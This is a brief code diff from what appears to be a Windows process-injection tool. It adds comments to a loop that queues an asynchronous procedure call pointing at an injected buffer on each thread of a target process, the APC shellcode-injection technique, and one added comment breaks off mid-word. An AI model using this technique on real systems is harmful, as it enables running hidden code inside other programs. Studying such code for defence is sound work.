@@ -88,6 +88,8 @@ INT main(INT argc, LPSTR argv[]) {
 	while (!lpThreads->empty()) {
 		hThread = *lpThreads->top();
 
+		// Queue user APC on the current thread handle of the process
+		// If the thread is in alertable state, it will execute the thre
 		QueueUserAPC((PAPCFUNC)lpBuffer, hThread, NULL);
 		CloseHandle(hThread);
 		Sleep(200);
@@ -100,7 +102,6 @@ INT main(INT argc, LPSTR argv[]) {
 	delete lpThreads;
 	lpThreads = nullptr;
 	CloseHandle(hProcess);
-
 
 	return 0x0;
 }
